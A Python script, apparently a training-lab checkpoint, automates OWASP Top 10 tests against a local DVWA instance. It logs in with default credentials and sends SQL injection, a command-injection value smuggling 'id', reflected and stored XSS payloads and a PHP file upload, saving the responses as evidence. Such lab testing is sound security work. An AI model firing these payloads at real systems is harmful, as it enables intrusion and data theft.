#!/usr/bin/env python3
"""
NationalBank Reserve — Checkpoint 3
OWASP Top 10 Automated Tester
Author: Mustafa Musa Ahmed
"""

import requests
import re
import sys
from datetime import datetime

BASE = "http://localhost"
EVIDENCE = "../02-evidence"

def log(msg):
    print(f"[*] {msg}")

def success(msg):
    print(f"[+] {msg}")

def fail(msg):
    print(f"[-] {msg}")

def extract_csrf(html):
    """Extract user_token from DVWA HTML"""
    match = re.search(r'name=[\'"]user_token[\'"] value=[\'"]([a-f0-9]+)[\'"]', html)
    return match.group(1) if match else None

def login(session):
    """Login to DVWA with CSRF token handling"""
    log("Fetching login page...")
    r = session.get(f"{BASE}/login.php")
    token = extract_csrf(r.text)
    if not token:
        fail("Could not find CSRF token")
        return False
    
    log(f"CSRF token: {token[:16]}...")
    
    log("Sending login request...")
    r = session.post(
        f"{BASE}/login.php",
        data={
            "username": "admin",
            "password": "password",
            "Login": "Login",
            "user_token": token
        },
        allow_redirects=True
    )
    
    if "You have logged in as" in r.text or "DVWA" in r.text and "Login" not in r.url:
        success("Login successful")
        return True
    else:
        fail(f"Login failed. URL: {r.url}")
        return False

def set_security_low(session):
    """Set DVWA security level to low"""
    log("Setting security level to low...")
    r = session.get(f"{BASE}/security.php")
    token = extract_csrf(r.text)
    
    r = session.post(
        f"{BASE}/security.php",
        data={"security": "low", "seclevel_submit": "Submit", "user_token": token}
    )
    
    if "low" in r.text.lower():
        success("Security level set to LOW")
        return True
    return False

def test_sqli(session):
    """Test SQL Injection (A03)"""
    print("\n" + "="*60)
    print("A03: SQL INJECTION TEST")
    print("="*60)
    
    # Normal query
    log("Testing: Normal query (id=1)")
    r_normal = session.get(f"{BASE}/vulnerabilities/sqli/?id=1&Submit=Submit")
    
    with open(f"{EVIDENCE}/A03-sqli-normal.html", "w") as f:
        f.write(r_normal.text)
    
    normal_users = re.findall(r'First name: (\w+)', r_normal.text)
    log(f"Normal result: {len(normal_users)} user(s) → {normal_users}")
    
    # Injection
    log("Testing: SQL Injection (' OR '1'='1)")
    payload = "1' OR '1'='1"
    r_inject = session.get(f"{BASE}/vulnerabilities/sqli/", params={"id": payload, "Submit": "Submit"})
    
    with open(f"{EVIDENCE}/A03-sqli-injection.html", "w") as f:
        f.write(r_inject.text)
    
    inject_users = re.findall(r'First name: (\w+)', r_inject.text)
    log(f"Injection result: {len(inject_users)} user(s) → {inject_users}")
    
    if len(inject_users) > len(normal_users):
        success(f"SQLi CONFIRMED! Extracted {len(inject_users)} users via injection")
        success(f"Payload: {payload}")
        return True
    else:
        fail("SQLi not detected")
        return False

def test_cmdi(session):
    """Test Command Injection (A03)"""
    print("\n" + "="*60)
    print("A03: COMMAND INJECTION TEST")
    print("="*60)
    
    log("Testing: Normal ping (127.0.0.1)")
    r_normal = session.post(
        f"{BASE}/vulnerabilities/exec/",
        data={"ip": "127.0.0.1", "Submit": "Submit"}
    )
    
    with open(f"{EVIDENCE}/A03-cmdi-normal.html", "w") as f:
        f.write(r_normal.text)
    
    log("Testing: Command Injection (127.0.0.1; id)")
    payload = "127.0.0.1; id"
    r_inject = session.post(
        f"{BASE}/vulnerabilities/exec/",
        data={"ip": payload, "Submit": "Submit"}
    )
    
    with open(f"{EVIDENCE}/A03-cmdi-injection.html", "w") as f:
        f.write(r_inject.text)
    
    if "uid=" in r_inject.text:
        uid = re.search(r'uid=\d+\([^)]+\)', r_inject.text)
        success(f"Command Injection CONFIRMED! {uid.group(0) if uid else 'RCE'}")
        success(f"Payload: {payload}")
        return True
    else:
        fail("Command Injection not detected")
        return False

def test_xss_reflected(session):
    """Test Reflected XSS (A03)"""
    print("\n" + "="*60)
    print("A03: REFLECTED XSS TEST")
    print("="*60)
    
    payload = "<script>alert('XSS')</script>"
    log(f"Testing payload: {payload}")
    
    r = session.get(
        f"{BASE}/vulnerabilities/xss_r/",
        params={"name": payload, "Submit": "Submit"}
    )
    
    with open(f"{EVIDENCE}/A03-xss-reflected.html", "w") as f:
        f.write(r.text)
    
    if payload in r.text:
        success(f"Reflected XSS CONFIRMED! Payload reflected in response")
        return True
    else:
        fail("Reflected XSS not detected")
        return False

def test_xss_stored(session):
    """Test Stored XSS (A03)"""
    print("\n" + "="*60)
    print("A03: STORED XSS TEST")
    print("="*60)
    
    payload = "<script>alert('StoredXSS')</script>"
    log(f"Testing payload: {payload}")
    
    r = session.post(
        f"{BASE}/vulnerabilities/xss_s/",
        data={"txtName": "TestUser", "mtxMessage": payload, "btnSign": "Sign Guestbook"}
    )
    
    with open(f"{EVIDENCE}/A03-xss-stored.html", "w") as f:
        f.write(r.text)
    
    if payload in r.text:
        success(f"Stored XSS CONFIRMED! Payload persisted in guestbook")
        return True
    else:
        fail("Stored XSS not detected")
        return False

def test_csrf(session):
    """Test CSRF (A01)"""
    print("\n" + "="*60)
    print("A01: CSRF TEST")
    print("="*60)
    
    # Check if password change form has CSRF token
    r = session.get(f"{BASE}/vulnerabilities/csrf/")
    
    with open(f"{EVIDENCE}/A01-csrf-form.html", "w") as f:
        f.write(r.text)
    
    log("Checking password change form for CSRF token...")
    if "user_token" not in r.text:
        success("CSRF CONFIRMED! Password change form has NO CSRF token")
        success("Attack: Malicious page can change admin password silently")
        return True
    else:
        log("Form has CSRF token (protected)")
        return False

def test_file_upload(session):
    """Test File Upload (A08)"""
    print("\n" + "="*60)
    print("A08: FILE UPLOAD TEST")
    print("="*60)
    
    # Create a test PHP file
    test_php = '<?php echo "UPLOAD_SUCCESS"; ?>'
    
    log("Uploading test.php with PHP code...")
    files = {'uploaded': ('test.php', test_php, 'application/x-php')}
    r = session.post(
        f"{BASE}/vulnerabilities/upload/",
        files=files,
        data={"Upload": "Upload"}
    )
    
    with open(f"{EVIDENCE}/A08-file-upload.html", "w") as f:
        f.write(r.text)
    
    if "succesfully uploaded" in r.text.lower() or "test.php" in r.text:
        success("File Upload CONFIRMED! PHP file uploaded without validation")
        success("Impact: Remote Code Execution possible")
        return True
    else:
        fail("File Upload blocked")
        return False

def main():
    print("="*60)
    print("NationalBank Reserve — OWASP Top 10 Tester")
    print(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*60 + "\n")
    
    session = requests.Session()
    
    # Login
    if not login(session):
        print("\n[FATAL] Login failed. Exiting.")
        sys.exit(1)
    
    set_security_low(session)
    
    # Run tests
    results = {
        "A03-SQLi": test_sqli(session),
        "A03-CMDi": test_cmdi(session),
        "A03-XSS-Reflected": test_xss_reflected(session),
        "A03-XSS-Stored": test_xss_stored(session),
        "A01-CSRF": test_csrf(session),
        "A08-FileUpload": test_file_upload(session),
    }
    
    # Summary
    print("\n" + "="*60)
    print("SUMMARY")
    print("="*60)
    for test, result in results.items():
        status = "[+] VULNERABLE" if result else "[-] Not vulnerable"
        print(f"  {status}: {test}")
    
    vuln_count = sum(results.values())
    print(f"\nTotal vulnerabilities found: {vuln_count}/{len(results)}")
    print("="*60)

if __name__ == "__main__":
    main()
